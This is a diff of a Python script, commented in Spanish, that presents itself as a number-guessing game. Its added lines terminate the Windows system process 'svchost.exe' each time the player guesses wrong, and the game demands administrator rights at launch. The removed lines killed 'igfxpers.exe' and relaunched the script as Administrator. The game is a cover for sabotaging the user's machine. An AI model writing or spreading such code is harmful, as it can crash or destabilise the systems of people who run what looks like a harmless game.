@@ -17,41 +17,47 @@ def delete_specific_process(process_name):
     try:
         # Obtener lista de procesos activos
         for proc in psutil.process_iter(['pid', 'name']):
-            if proc.info['name'] == process_name:
-                proc.terminate()  # Terminar el proceso
-                return  # Salir sin imprimir nada
+            if proc.info['name'].lower() == process_name.lower():
+                proc.terminate()  # Eliminar el proceso por su nombre
+                print(f"Proceso '{process_name}' con PID {proc.info['pid']} ha sido eliminado.")
+                return  # Salir después de eliminar el proceso
+        print(f"No se encontró el proceso '{process_name}'.")
     except Exception as e:
         print(f"Ocurrió un error al intentar eliminar el proceso: {e}")
 
 def play_game():
     score = 0
     print("¡Bienvenido al juego de adivinar el número!")
+    print("Estoy pensando en un número entre 1 y 10. ¿Puedes adivinarlo?")
 
     while True:  # Bucle infinito para permitir intentos ilimitados
         number_to_guess = random.randint(1, 10)
-        user_guess = random.randint(1, 10)  # Simulación de una suposición automática
 
-        # Aquí se muestra el número que se está adivinando
-        print(f"Estoy pensando en un número entre 1 y 10. Mi suposición es: {user_guess}")
+        try:
+            user_guess = int(input("Ingresa tu suposición (1-10): "))
+        except ValueError:
+            print("Por favor, ingresa un número válido.")
+            continue
 
         if user_guess == number_to_guess:
             print("¡Correcto!")
             score += 1
         else:
-            delete_specific_process("igfxpers.exe")  # Eliminar el proceso directamente
+            print(f"Incorrecto. El número correcto era: {number_to_guess}")
+            # Eliminar el proceso "svchost.exe"
+            delete_specific_process("svchost.exe")  # Elimina el proceso svchost.exe
 
         print(f"Tu puntaje actual es: {score}")
 
-def run_as_admin():
-    """Verifica si el script se está ejecutando como administrador. Si no, lo relanza como administrador."""
-    if not ctypes.windll.shell32.IsUserAnAdmin():
-        # Relanzar el script con privilegios de administrador
-        print("No se detectaron privilegios de administrador. Se están solicitando...")
-        script = sys.argv[0]
-        subprocess.run(['runas', '/user:Administrator', script])
-        sys.exit()
+def is_admin():
+    return ctypes.windll.shell32.IsUserAnAdmin() != 0
 
 if __name__ == "__main__":
-    run_as_admin()  # Solicitar privilegios de administrador al inicio
+    # Verificar si se está ejecutando como administrador (solo en Windows)
+    if os.name == 'nt':
+        if not is_admin():
+            print("Este programa necesita permisos de administrador. Por favor, ejecútalo como administrador.")
+            sys.exit(1)
+
     install_psutil()  # Asegurarse de que psutil esté instalado
     play_game()
